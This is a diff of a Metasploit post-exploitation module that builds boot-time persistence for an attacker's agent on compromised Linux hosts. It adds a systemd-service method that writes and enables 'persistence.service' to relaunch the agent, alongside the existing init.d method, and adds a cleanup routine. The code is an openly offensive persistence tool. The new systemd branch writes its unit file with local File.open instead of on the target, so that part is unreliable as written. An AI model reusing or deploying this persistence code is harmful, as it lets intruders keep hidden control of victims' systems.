@@ -13,10 +13,11 @@
 #
 #
 # [ DESCRIPTION ]
-# Builds 'persistance' init.d startup script that allow users to
-# persiste your binary (executable) on Linux distros at every startup.
-# HINT: This post-module accepts any 'linux' chmoded agents (elf|sh|py|rb|empty)
-# HINT: This post-module requires the agent allready deployed on target system.
+# Builds 'persistance' init.d startup script that allow users to persiste your agent
+# (executable) on Linux distros at every startup. This post-module requires the agent
+# allready deployed on target system and accepts any 'linux' chmoded agents (elf|sh|py|rb|pl)
+# to be auto-executed at startup. This module also accepts shebang agents (eg #!/usr/bin/python)
+# and allow users to use 'systemd' (advanced option) as an alternative way to persiste your agent.
 # HINT: In Kali distos we are 'root' by default, so this post module does
 # not required privilege escalation in systems were we are allready root ..
 #
@@ -28,6 +29,7 @@
 # The full remote path of init.d directory  (remote) => set INIT_PATH /etc/init.d
 # Delete persistence script/configurations  (remote) => set DEL_PERSISTENCE true
 # Execute one simple bash command           (remote) => set SINGLE_COM uname -a
+# Use 'systemd' insted of 'init.d' to persiste?      => set SYSTEMD true
 # Use agents with [shebang]? (eg #!/usr/bin/python)  => set SHEBANG true
 # ---
 # If sellected 'SHEBANG true' then agent execution will be based on is shebang
@@ -97,7 +99,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'Linux Kali init.d persistence post-module',
                         'Description'   => %q{
-                                        Builds 'persistance' init.d startup script that allow users to persiste your agent (executable) on Linux distros at every startup. This post-module requires the agent allready deployed on target system and accepts any 'linux' chmoded agents (elf|sh|py|rb|pl) to be auto-executed at startup. This module will also accepts shebang agents (eg #!/usr/bin/python).
+                                        Builds 'persistance' init.d startup script that allow users to persiste your agent (executable) on Linux distros at every startup. This post-module requires the agent allready deployed on target system and accepts any 'linux' chmoded agents (elf|sh|py|rb|pl) to be auto-executed at startup. This module also accepts shebang agents (eg #!/usr/bin/python) and allow users to use 'systemd' (advanced option) as an alternative way to persiste your agent.
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -105,8 +107,8 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.5',
-                        'DisclosureDate' => 'jun 1 2017',
+                        'Version'        => '$Revision: 1.6',
+                        'DisclosureDate' => 'jun 2 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false',   # thats no need for privilege escalation (in-kali) ..
@@ -119,6 +121,7 @@ class MetasploitModule < Msf::Post
                                 [
                                          [ 'URL', 'http://goo.gl/ny69NS' ],
                                          [ 'URL', 'http://goo.gl/LZG1LQ' ],
+                                         [ 'URL', 'http://goo.gl/281pVK' ],
                                          [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                          [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]
                                 ],
@@ -144,6 +147,7 @@ class MetasploitModule < Msf::Post
                                 OptString.new('SINGLE_COM', [ false, 'Execute one simple command (eg uname -a)']),
                                 OptBool.new('SHEBANG', [ false, 'Use agents with [shebang]? (eg #!/bin/sh)' , false]),
                                 OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false]),
+                                OptBool.new('SYSTEMD', [ false, 'Use systemd insted of init.d to persiste our agent?' , false]),
                                 OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory (eg /etc/init.d)'])
                         ], self.class) 
 
@@ -159,7 +163,7 @@ def ls_stage1
   session = client
   rem = session.sys.config.sysinfo
   init = datastore['INIT_PATH']          # /etc/init.d
-  stime = datastore['START_TIME']        # 10 (sec to start the agent)
+  stime = datastore['START_TIME']        # 8 (sec to start the agent)
   remote_path = datastore['REMOTE_PATH'] # /root/agent
   script_check = "#{init}/persistance"   # /etc/init.d/persistance
   #
@@ -171,9 +175,79 @@ def ls_stage1
     print_warning("Please set REMOTE_PATH option!")
     return nil
   else
-    print_status("Persist #{remote_path} agent ..")
+    print_status("Persist: #{remote_path} agent ..")
     Rex::sleep(1.0)
   end
+
+
+#
+# Use 2º alternative method (systemd service creation)
+#
+if datastore['SYSTEMD'] == true
+
+  serv_path = "/etc/systemd/system"
+  serv_file = "/etc/systemd/system/persistence.service"
+    #
+    # Check if persistence its allready active ..
+    #
+    if session.fs.file.exist?(serv_file)
+      print_error("systemd: #{serv_file} found ..")
+      print_error("Post-module reports that persistence its allready active ..")
+      print_error("Please set DEL_PERSISTENCE option before running this funtion ..")
+      print_line("")
+      return nil
+    end
+    #
+    # Check if agent its deployed (remote) ..
+    #
+    if not session.fs.file.exist?(remote_path)
+      print_error("agent: #{remote_path} not found ..")
+      print_error("Please upload your agent before running this funtion ..")
+      print_line("")
+      return nil
+    end
+    print_status("Remote agent full path found ..")
+
+      #
+      # This is the systemd script that provides persistence on startup ..
+      #
+      print_warning("Writing systemd persistence startup script ..")
+      Rex::sleep(1.0)
+      File.open("#{serv_file}", "w") do |f|
+        f.write("[Unit]\n")
+        f.write("After=network.target network-online.target\n\n")
+        f.write("[Service]\n")
+        f.write("ExecStart=#{remote_path}\n\n")
+        f.write("[Install]\n")
+        f.write("WantedBy=multi-user.target\n")
+        f.close
+      end
+      print_good("Service path: #{serv_file}")
+      Rex::sleep(1.0)
+
+      #
+      # Config systemd startup service (chmod + daemon-reload + systemctl enable)
+      #
+      if session.fs.file.exist?(serv_file)
+        print_good("Config systemd persistence script ..")
+        cmd_exec("chmod 664 #{serv_file}")
+        Rex::sleep(1.0)
+        print_good("Reloading systemctl daemon ..")
+        cmd_exec("systemctl daemon-reload")
+        Rex::sleep(1.0)
+        print_good("Enable systemctl service ..")
+        cmd_exec("systemctl enable persistence.service")
+        Rex::sleep(1.0)
+      else
+        print_error("systemd script: #{serv_file} not found ..")
+        print_error("Persistence on: #{rem['Computer']} not achieved ..")
+        print_line("")
+        return nil
+      end
+
+
+else
+
 
     #
     # Check if persistence its allready active ..
@@ -239,7 +313,7 @@ def ls_stage1
       #
       print_warning("Writing init.d persistence startup script ..")
       Rex::sleep(1.0)
-      File.open("#{script_check}", "w+") do |f|
+      File.open("#{script_check}", "w") do |f|
         f.write("#!/bin/sh\n")
         f.write("### BEGIN INIT INFO\n")
         f.write("# Provides:          persistence on kali\n")
@@ -275,6 +349,8 @@ def ls_stage1
         print_line("")
         return nil
       end
+
+end
 
     #
     # Final displays to user ..
@@ -312,9 +388,53 @@ def ls_stage2
     print_warning("Please set DEL_PERSISTENCE option!")
     return nil
   else
-    print_status("Delete init.d persistence script ..")
+    print_status("Delete startup persistence script ..")
     Rex::sleep(1.0)
   end
+
+
+#
+# Use 2º alternative method (systemd service creation)
+#
+if datastore['SYSTEMD'] == true
+
+  serv_path = "/etc/systemd/system"
+  serv_file = "/etc/systemd/system/persistence.service"
+    #
+    # Check systemd persiste script existance ..
+    #
+    if not session.fs.file.exist?(serv_file)
+      print_error("script: #{serv_file} not found ..")
+      print_error("Post-module reports that none persistence was found ..")
+      print_line("")
+      return nil
+    end
+    print_status("Persistence script full path found ..")
+
+      #
+      # Delete systemd script ..
+      #
+      print_good("Removing script from systemd directory ..")
+      cmd_exec("rm -f #{serv_file}")
+      Rex::sleep(1.0)
+      print_good("Reloading systemctl daemon process ..")
+      cmd_exec("sudo systemctl daemon-reload")
+      Rex::sleep(1.0)
+
+    #
+    # Check systemd persiste script existance (after delete) ..
+    #
+    if session.fs.file.exist?(serv_file)
+      print_error("script: #{serv_file} not proper deleted ..")
+      print_error("Please manually delete : rm -f #{serv_file}")
+      print_error("Please manually execute: sudo systemctl daemon-reload")
+      print_line("")
+      return nil
+    end
+
+
+else
+
 
     #
     # Check init.d persiste script existance ..
@@ -347,6 +467,8 @@ def ls_stage2
       print_line("")
       return nil
     end
+
+end
 
     #
     # Final displays to user ..
@@ -388,7 +510,7 @@ def ls_stage3
   end
 
       #
-      # msf API call to execute bash command remotlly  ..
+      # msf API call to execute bash command remotelly  ..
       #
       print_good("Executing: #{exe_com}")
       Rex::sleep(1.0)
@@ -403,7 +525,6 @@ def ls_stage3
   #
   rescue ::Exception => e
   print_error("Error: #{e.class} #{e}")
-
 end
 
 
@@ -446,14 +567,14 @@ def run
     # check for proper operative system (Linux)
     #
     if not sysinfo['OS'] =~ /Linux/
-      print_error("[ ABORT ]: This module only works againt Linux systems")
+      print_error("[ABORT]: This module only works againt Linux systems")
       return nil
     end
     #
     # Check if we are running in an higth integrity context (root)
     #
     if not runtor =~ /uid=0/
-      print_error("[ ABORT ]: Root access is required in non-Kali distros ..")
+      print_error("[ABORT]: Root access is required in non-Kali distros ..")
       return nil
     end
     #
@@ -463,7 +584,7 @@ def run
     if not sysinfo.nil?
       print_status("Running module against: #{sysnfo['Computer']}")
     else
-      print_error("[ ABORT ]: This module only works in meterpreter sessions!")
+      print_error("[ABORT]: This module only works in meterpreter sessions!")
       return nil
     end
 
